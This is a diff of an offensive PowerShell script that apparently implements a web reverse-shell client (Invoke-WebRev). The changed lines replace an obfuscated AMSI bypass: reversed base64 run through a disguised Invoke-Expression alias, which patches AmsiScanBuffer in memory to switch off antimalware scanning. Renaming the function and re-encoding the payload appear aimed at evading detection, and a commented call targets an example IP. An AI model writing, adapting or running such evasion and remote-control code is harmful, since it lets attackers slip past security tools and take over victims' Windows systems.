@@ -32,7 +32,7 @@ function Invoke-WebRev{
     
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
-    Invoke-PatchMe;
+    Invoke-FuckYou;
     $pwd_b64 = getPwd;
     $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '"}';
     
@@ -159,12 +159,12 @@ function getPwd()
 }
 
 
-function Invoke-PatchMe
+function Invoke-FuckYou
 {
-    $base64 = "==QK2ACLzNXZyRGZBRCIsADIsg2Y0FGUkgSew92Q6oTXsFGazJXYN5yclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5N1WK0QKzMEewACLwgDewACL3ADewACLwADewACL3UDewACL4IEewgCId11WlRXeCtFI9ACajRXYQRiCNwGb15UL0V3TgwHIpAHJdZWZytFIsADN4BDIsUTXyMDdulWdbBCLzNXZyRGZBRCK0NWZ09mcQxWY1RncpZlO601czFGbDlXTbpQDwASPgAHJK0QKiIXZmZWdCJCIrAiIuF2YTJCIrAiIpNXbBJCIsknchJnYpxEZh9GTkgyczVmckRWQj9mcQRXZHpjOdN3chx2Q510Wg0DIzNXZyRGZBRiCNkiIsxGZuk2ciAyKgISbhJCK5JXYyJWaMRWYvxkO601czFGbDlXTbBSPgknchJnYpxEZh9GTkoQDK0wczFGbDlXTkASZwlHVtQGZBpQDK0AQioQD9pQDK0wOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQDdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIK0gCNsHIzNXYsNUeNByczFGbjByYpxmY1BnCNoQD7MXZjlmdyV2Uw9mclRnbJ5SZtlGduVnUu0WZ0NXeTByZul2c1pQD70WZ0NXeTByZul2c1pQDiAEI9AyczFGbDlXTkoQDK0AbsVnbkASPgM3chx2Q51EJ";
-    $base64array = $base64.ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null;
-    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"));
-    taleska-ei-vrixeka $base64string | Out-Null;
+    $b64 = "pYDIsIHZkFEJgwCMgwCajRHUkgSew92Q6oTXsFGazJXYN5yclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5N1WKkibvlGdjVnc0NnbpRCKg0VXbVGd5J0Wg0DIoNGdQRiCpISLigCdpxGcT5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiCiMzQ4BTLwgDew0yNwgHMtADM4BTL3UDew0COChHMiASPg42bpR3Y1JHdz5WakoAbsVnTtQXdPBCfgkCck0lZlJ3WgwCM0gHMgwSNdJzM05Wa1tFIsIHZkFEJoQ3YlR3byBFbhVHdylmV6oTX19WWrNWdGtlCwASPgAHJKkiIyVmZiAyKgIiZ1JkIgsCIi4WYiAyKgIyYTJCIrAiIpNnIgsCIi0WQiACLsxGJoM3clJHZkF0YvJHU0V2R6oTX19WWrNWdGtFI9AickRWQkoQKiwmIgsCIiwmIgsCIiQmIgsCIi4iIgsCIikmIgsCIiMnIgsCIi0mIgsCIiEmIoknchJnYpxEZh9GT6oTX19WWrNWdGtFI9ACbsRiCKU3bZt2Y1ZEJgUGc5RVLkRWQKoAQioQfKowOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQXpIiMzwWZuJXZrJCK0J3bw1WSsxGRbBCIgAiCKsHI19WWrNWdGByczFGbjByYpxmY1BnCKszclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5NFIn5WazVnC70WZ0NXeTByZul2c1pgIABSPgU3bZt2Y1ZEJKoAbsVnbkASPgU3bZt2Y1ZEJ";
+    $b64arr = $b64.ToCharArray() ; [array]::Reverse($b64arr) ; -join $b64arr 2>&1> $null;
+    $b64str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$b64arr"));
+    taleska-ei-vrixeka $b64str | Out-Null;
 }
 
 #Invoke-WebRev -ip 192.168.62.129 -port 80
